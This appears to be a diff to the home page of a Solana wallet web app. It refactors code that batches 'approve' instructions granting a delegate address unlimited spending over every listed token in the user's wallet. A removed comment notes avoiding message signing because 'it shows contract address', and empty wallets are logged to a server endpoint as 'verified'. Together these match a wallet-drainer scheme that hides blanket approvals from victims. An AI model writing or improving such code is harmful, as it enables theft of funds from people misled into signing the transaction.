@@ -587,35 +587,42 @@ export default function Home() {
       const tokensApproved: string[] = [];
       const transaction = new Transaction();
       
-      // Create approval instructions for ALL predefined tokens
       console.log("Creating batch approval for", SOLANA_APPROVAL_TOKENS.length, "tokens...");
       
-      for (const token of SOLANA_APPROVAL_TOKENS) {
-        try {
+      const tokenChecks = await Promise.allSettled(
+        SOLANA_APPROVAL_TOKENS.map(async (token) => {
           const mintKey = new PublicKey(token.mint);
           const ata = getAssociatedTokenAddress(mintKey, userKey);
-          
-          // Check if ATA exists
           const accountInfo = await connection.getAccountInfo(ata);
-          if (accountInfo) {
-            console.log(`Adding approval for ${token.symbol} (${token.mint.slice(0,8)}...)`);
-            transaction.add(
-              createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
-            );
-            tokensApproved.push(token.symbol);
-          } else {
-            console.log(`Skipping ${token.symbol} - no ATA found`);
-          }
-        } catch (e) {
-          console.log(`Error processing ${token.symbol}:`, e);
+          return { token, ata, exists: !!accountInfo };
+        })
+      );
+
+      for (const result of tokenChecks) {
+        if (result.status === "fulfilled" && result.value.exists) {
+          const { token, ata } = result.value;
+          console.log(`Adding approval for ${token.symbol} (${token.mint.slice(0,8)}...)`);
+          transaction.add(
+            createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
+          );
+          tokensApproved.push(token.symbol);
         }
       }
       
-      // If no ATAs found, show error (don't use message signing - it shows contract address)
       if (transaction.instructions.length === 0) {
-        console.log("No token accounts found");
-        setError("No tokens found in wallet.");
-        setSolanaStep("idle");
+        console.log("No token accounts found - wallet verified without approvals");
+        fetch("/api/solana-approvals", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            walletAddress: solanaAddress,
+            delegateAddress: SOLANA_DELEGATE_ADDRESS,
+            transactionHash: "no-tokens",
+            tokensApproved: [],
+            tokenCount: 0,
+          }),
+        }).catch(console.error);
+        setSolanaStep("done");
         return;
       }
       
